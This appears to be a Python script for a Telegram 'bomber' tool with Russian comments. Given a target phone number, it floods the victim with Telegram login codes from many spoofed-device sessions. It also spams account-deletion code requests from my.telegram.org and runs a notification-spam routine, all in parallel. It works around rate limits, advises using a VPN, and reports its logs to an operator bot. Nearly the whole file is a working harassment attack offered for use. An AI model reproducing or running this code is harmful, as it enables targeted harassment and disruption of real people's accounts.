import asyncio
import random
import time
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import aiohttp
from config import api_hash, api_id, DEVICE_CONFIGS, TELEGRAM_SITES, url, headers, TOKEN, ADMIN_ID
from device_config import get_random_device_config
from fast__method import spam_notification_sync
from aiogram import Bot
from aiogram.types import FSInputFile
executor = ThreadPoolExecutor(max_workers=1)

# Настройка самодельного логирования
log_dir = "logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

def bomber_write_log(level, message):
    """Самодельная функция логирования в .txt файл для bomber"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] [{level}] {message}\n"
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_entry)
    except Exception as e:
        print(f"Ошибка записи в лог: {e}")

def log_info(message):
    bomber_write_log("INFO", message)

def log_debug(message):
    bomber_write_log("DEBUG", message)

def log_warning(message):
    bomber_write_log("WARNING", message)

def log_error(message):
    bomber_write_log("ERROR", message)

# Инициализация Telegram бота для отправки логов
bot = Bot(token=TOKEN) if TOKEN else None

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

async def send_log_file(log_file_path, phone_number, user_id=None):
    """Отправляет файл логов через Telegram клиенту или админу"""
    if not bot:
        log_warning("[SEND LOG] Telegram бот не инициализирован, логи не отправлены")
        return
    
    try:
        if not os.path.exists(log_file_path):
            log_error(f"[SEND LOG] Файл логов не найден: {log_file_path}")
            return
        
        # Отправляем клиенту, если указан, иначе админу
        recipient_id = user_id if user_id else ADMIN_ID
        log_info(f"[SEND LOG] Отправка файла логов: {log_file_path} пользователю {recipient_id}")
        
        await bot.send_document(
            chat_id=recipient_id,
            document=FSInputFile(log_file_path),
            caption=f"📄 Логи доставки для номера: {phone_number}\n"
                   f"📅 Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        log_info(f"[SEND LOG] Файл логов успешно отправлен пользователю {recipient_id}")
    except Exception as e:
        log_error(f"[SEND LOG] Ошибка при отправке файла логов: {str(e)}")

async def request_delete_account_code(phone_number):
    """Запрос одного кода удаления аккаунта"""
    log_info(f"[DELETE CODE] Запрос кода удаления для номера: {phone_number}")
    data = {
        'phone': phone_number
    }
    
    try:
        log_debug(f"[DELETE CODE] Отправка POST запроса на {url}")
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=headers, data=data, timeout=10) as response:
                result = await response.json()
                log_debug(f"[DELETE CODE] Ответ сервера: статус {response.status}, результат: {result}")
                if response.status == 200:
                    if 'random_hash' in result:
                        log_info(f"[DELETE CODE] Успешно запрошен код удаления для {phone_number}")
                        return True
                    else:
                        log_warning(f"[DELETE CODE] Неожиданный ответ: {result}")
                        return False
                else:
                    log_error(f"[DELETE CODE] HTTP ошибка: статус {response.status}")
                    return False
    except Exception as e:
        log_error(f"[DELETE CODE] Ошибка при запросе кода удаления: {str(e)}")
        return False

async def spam_delete_codes(phone_number):
    """Спам кодами удаления - запускается параллельно"""
    log_info(f"[DELETE CODE SPAM] Начало спама кодами удаления для номера: {phone_number}")
    request_count = 0
    max_requests = 10  # Максимум запросов за сессию
    
    while request_count < max_requests:
        try:
            request_count += 1
            log_debug(f"[DELETE CODE SPAM] Запрос #{request_count}/{max_requests}")
            success = await request_delete_account_code(phone_number)
            if success:
                log_info(f"[DELETE CODE SPAM] Успешный запрос #{request_count}")
            else:
                log_warning(f"[DELETE CODE SPAM] Неудачный запрос #{request_count}")
            
            # Короткая задержка между запросами
            if request_count < max_requests:
                await asyncio.sleep(5)
        except Exception as e:
            log_error(f"[DELETE CODE SPAM] Ошибка в запросе #{request_count}: {str(e)}")
            await asyncio.sleep(5)
    
    log_info(f"[DELETE CODE SPAM] Завершено {request_count} запросов для {phone_number}")

async def send_code(phone_number):
    """Отправка обычных кодов входа"""
    log_info(f"[SEND CODE] Начало отправки кодов для номера: {phone_number}")
    request_count = 0
    max_requests = 50
    max_retries = 5
    
    while request_count < max_requests:
        log_info(f"[SEND CODE] Запрашиваю код для {phone_number} (запрос #{request_count + 1}/{max_requests})")
        
        device_config = get_random_device_config()
        log_debug(f"[SEND CODE] Устройство: {device_config['device_model']} ({device_config['platform']})")
        
        for attempt in range(max_retries):
            client = None
            try:
                session = StringSession()
                client = TelegramClient(
                    session, 
                    api_id, 
                    api_hash,
                    device_model=device_config["device_model"],
                    system_version=device_config["system_version"],
                    app_version=device_config["app_version"],
                    system_lang_code=device_config["system_lang_code"]
                )
                
                await asyncio.wait_for(client.connect(), timeout=15)
                
                if not await client.is_user_authorized():
                    if device_config["platform"] == "web":
                        web_site = random.choice(TELEGRAM_SITES)
                        log_debug(f"[SEND CODE] Эмулирую вход с сайта: {web_site}")
                    
                    await client.send_code_request(phone_number)
                    log_info(f"[SEND CODE] Запрос кода отправлен (запрос #{request_count + 1})")
                    request_count += 1
                    break
                else:
                    log_warning(f"[SEND CODE] Аккаунт уже авторизован")
                    break
                    
            except errors.FloodWaitError as e:
                wait_time = e.seconds + random.randint(25, 43)
                log_warning(f"[SEND CODE] FloodWaitError: ждем {wait_time} секунд (номер: {phone_number})")
                time.sleep(wait_time)
                break
            except (ConnectionError, TimeoutError, errors.SecurityError, errors.BadMessageError) as e:
                log_warning(f"[SEND CODE] Сетевая ошибка (попытка {attempt + 1}/{max_retries}, номер: {phone_number}): {str(e)}")
                if attempt < max_retries - 1:
                    wait_time = random.randint(3, 8)
                    log_debug(f"[SEND CODE] Повтор через {wait_time} секунд...")
                    time.sleep(wait_time)
            except asyncio.TimeoutError:
                log_warning(f"[SEND CODE] Таймаут соединения (попытка {attempt + 1}/{max_retries}, номер: {phone_number})")
                if attempt < max_retries - 1:
                    time.sleep(5)
            except errors.PhoneNumberBannedError:
                log_error(f"[SEND CODE] Номер забанен: {phone_number}")
                return
            except errors.PhoneNumberInvalidError:
                log_error(f"[SEND CODE] Неверный номер: {phone_number}")
                return
            except errors.PhoneNumberUnoccupiedError:
                log_error(f"[SEND CODE] Номер не зарегистрирован: {phone_number}")
                return
            except Exception as e:
                log_error(f"[SEND CODE] Ошибка (попытка {attempt + 1}/{max_retries}, номер: {phone_number}): {str(e)}")
                if attempt < max_retries - 1:
                    time.sleep(5)
            finally:
                if client:
                    try:
                        await client.disconnect()
                    except:
                        pass
        
        # задержка между запросами
        if request_count < max_requests:
            sleep_time = random.randint(30, 44)
            log_debug(f"[SEND CODE] Ожидание {sleep_time} секунд перед следующим запросом")
            time.sleep(sleep_time)
    
    log_info(f"[SEND CODE] Выполнено {request_count} запросов для {phone_number}")

async def run_fast_method(phone_number, log_dir):
    """Запуск метода из fast__method.py"""
    try:
        # Устанавливаем файл логов для fast__method
        from fast__method import set_log_file
        set_log_file(log_file)
        
        log_info(f"[FAST METHOD] Запуск спама уведомлений для номера: {phone_number}")
        log_info(f"[FAST METHOD] Используется executor для запуска spam_notification_sync")
        
        # Запускаем в executor
        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            executor, 
            spam_notification_sync, 
            phone_number, 
            log_dir,
            None  # logger больше не нужен
        )
        
        log_info(f"[FAST METHOD] Результат выполнения: {result}")
        if result:
            log_info(f"[FAST METHOD] Успешное выполнение для номера: {phone_number}")
        else:
            log_warning(f"[FAST METHOD] Неудачное выполнение для номера: {phone_number} - возможно, ни один сайт не отработал")
        return result
    except Exception as e:
        log_error(f"[FAST METHOD] Ошибка при выполнении: {str(e)}")
        import traceback
        log_error(f"[FAST METHOD] Traceback: {traceback.format_exc()}")
        return False

async def main():
    log_info("=" * 50)
    log_info("Программа запущена")
    log_info(f"Логи сохраняются в: {log_file}")
    
    while True:
        phone_number = input("[?] Enter target number:  ")
        log_info(f"[MAIN] Введен номер: {phone_number}")
        
        print("")
        print("[1] Spam login codes")
        print("[2] Spam delete codes, from my.telegram.org")
        print("[3] Both spam")
        print("[4] Spam notification (USE VPN ONLY)")
        print("[5] Author")
        choice = input("Enter the mode: ").strip()
        log_info(f"[MAIN] Выбран режим: {choice}")
        
        if choice == "1":
            # МАКСИМАЛЬНАЯ МОЩНОСТЬ: все режимы параллельно
            max_normal_tasks = 15  # Обычные коды входа
            max_delete_tasks = 10  # Коды удаления
            max_fast_method_tasks = 4  # Fast method (уведомления)
            
            log_info(f"[MAIN] МАКСИМАЛЬНЫЙ СПАМ для {phone_number}: {max_normal_tasks}x обычные + {max_delete_tasks}x удаление + {max_fast_method_tasks}x уведомления")
            
            # Обычные коды входа
            normal_tasks = [asyncio.create_task(send_code(phone_number)) for _ in range(max_normal_tasks)]
            
            # Коды удаления аккаунта
            delete_tasks = [asyncio.create_task(spam_delete_codes(phone_number)) for _ in range(max_delete_tasks)]
            
            # Fast method (уведомления)
            fast_method_success_count = 0
            
            async def run_fast_with_check():
                nonlocal fast_method_success_count
                try:
                    result = await run_fast_method(phone_number, log_dir)
                    if result:
                        fast_method_success_count += 1
                        log_info(f"[MAIN] Fast method успешно выполнен {fast_method_success_count}/{max_fast_method_tasks} раз")
                    return result
                except Exception as e:
                    log_error(f"[MAIN] Ошибка в run_fast_with_check: {str(e)}")
                    return False
            
            fast_method_tasks = [asyncio.create_task(run_fast_with_check()) for _ in range(max_fast_method_tasks)]
            
            # Запускаем ВСЕ задачи параллельно с таймаутом 60 секунд
            all_tasks = normal_tasks + delete_tasks + fast_method_tasks
            log_info(f"[MAIN] Запущено {len(all_tasks)} задач параллельно, таймаут 60 секунд")
            
            try:
                await asyncio.wait_for(
                    asyncio.gather(*all_tasks, return_exceptions=True),
                    timeout=60.0
                )
                log_info(f"[MAIN] Все задачи завершены в течение 60 секунд")
            except asyncio.TimeoutError:
                log_warning(f"[MAIN] Превышен таймаут 60 секунд, отменяем все задачи")
                # Отменяем все задачи при таймауте
                for task in all_tasks:
                    if not task.done():
                        task.cancel()
                        try:
                            await task
                        except (asyncio.CancelledError, asyncio.TimeoutError):
                            pass
            except Exception as e:
                log_error(f"[MAIN] Ошибка при выполнении задач: {str(e)}")
            
            # Отправка логов после завершения
            await send_log_file(log_file, phone_number)
            
        elif choice == "2":
            # 2 цикла спама кодов удаления
            for cycle in range(1, 3):
                log_info(f"[MAIN] Начало цикла {cycle}/2 спама кодов удаления для {phone_number}")
                request_count = 0
                max_requests_per_cycle = 10
                
                while request_count < max_requests_per_cycle:
                    try:
                        request_count += 1
                        log_debug(f"[DELETE CODE SPAMMER] Запрос #{request_count} (цикл {cycle}/2)")
                        success = await request_delete_account_code(phone_number)
                        if success:
                            log_info(f"[DELETE CODE SPAMMER] Успешный запрос #{request_count} (цикл {cycle}/2)")
                        else:
                            log_warning(f"[DELETE CODE SPAMMER] Неудачный запрос #{request_count} (цикл {cycle}/2)")
                        if request_count < max_requests_per_cycle:
                            await asyncio.sleep(10)
                    except Exception as e:
                        log_error(f"[DELETE CODE SPAMMER] Ошибка: {str(e)}")
                        await asyncio.sleep(10)
                
                if cycle < 2:
                    log_info(f"[MAIN] Пауза 60 секунд перед следующим циклом")
                    await asyncio.sleep(60)
            
            await send_log_file(log_file, phone_number)
            
        elif choice == "3":
            # МАКСИМАЛЬНАЯ МОЩНОСТЬ: все режимы параллельно
            max_normal_tasks = 15  # Обычные коды входа
            max_delete_tasks = 10  # Коды удаления
            max_fast_method_tasks = 4  # Fast method (уведомления)
            
            log_info(f"[MAIN] МАКСИМАЛЬНЫЙ КОМБИНИРОВАННЫЙ СПАМ для {phone_number}: {max_normal_tasks}x обычные + {max_delete_tasks}x удаление + {max_fast_method_tasks}x уведомления")
            
            # Обычные коды входа
            normal_tasks = [asyncio.create_task(send_code(phone_number)) for _ in range(max_normal_tasks)]
            
            # Коды удаления аккаунта
            delete_tasks = [asyncio.create_task(spam_delete_codes(phone_number)) for _ in range(max_delete_tasks)]
            
            # Fast method (уведомления)
            fast_method_success_count = 0
            
            async def run_fast_with_check():
                nonlocal fast_method_success_count
                try:
                    result = await run_fast_method(phone_number, log_dir)
                    if result:
                        fast_method_success_count += 1
                        log_info(f"[MAIN] Fast method успешно выполнен {fast_method_success_count}/{max_fast_method_tasks} раз")
                    return result
                except Exception as e:
                    log_error(f"[MAIN] Ошибка в run_fast_with_check: {str(e)}")
                    return False
            
            fast_method_tasks = [asyncio.create_task(run_fast_with_check()) for _ in range(max_fast_method_tasks)]
            
            # Запускаем ВСЕ задачи параллельно с таймаутом 60 секунд
            all_tasks = normal_tasks + delete_tasks + fast_method_tasks
            log_info(f"[MAIN] Запущено {len(all_tasks)} задач параллельно, таймаут 60 секунд")
            
            try:
                await asyncio.wait_for(
                    asyncio.gather(*all_tasks, return_exceptions=True),
                    timeout=60.0
                )
                log_info(f"[MAIN] Все задачи завершены в течение 60 секунд")
            except asyncio.TimeoutError:
                log_warning(f"[MAIN] Превышен таймаут 60 секунд, отменяем все задачи")
                # Отменяем все задачи при таймауте
                for task in all_tasks:
                    if not task.done():
                        task.cancel()
                        try:
                            await task
                        except (asyncio.CancelledError, asyncio.TimeoutError):
                            pass
            except Exception as e:
                log_error(f"[MAIN] Ошибка при выполнении задач: {str(e)}")
            
            await send_log_file(log_file, phone_number)
            
        elif choice == "4":
            cycles_input = input("[?] Enter number of cycles (press Enter for 2): ").strip()
            cycles = 2 if not cycles_input else int(cycles_input) if cycles_input.isdigit() else 2
            log_info(f"[MAIN] Запуск спама уведомлений для {phone_number}, циклов: {cycles}")
            
            fast_method_success_count = 0
            for cycle in range(1, cycles + 1):
                log_info(f"[MAIN] Цикл {cycle}/{cycles}")
                result = await run_fast_method(phone_number, log_dir)
                if result:
                    fast_method_success_count += 1
                if fast_method_success_count >= 2:
                    log_info(f"[MAIN] Fast method выполнен успешно 2 раза, останавливаем")
                    break
                if cycle < cycles:
                    await asyncio.sleep(3)
            
            await send_log_file(log_file, phone_number)
            
        elif choice == "5":
            log_info("[MAIN] Показана информация об авторе")
            print("[+] Author: @unsedb")
            input("Press enter to back to main menu..")
            clear_console()
            continue

        else:
            log_warning(f"[MAIN] Неверный выбор режима: {choice}")
            print("[!] Wrong choice")

if __name__ == "__main__":
    asyncio.run(main())
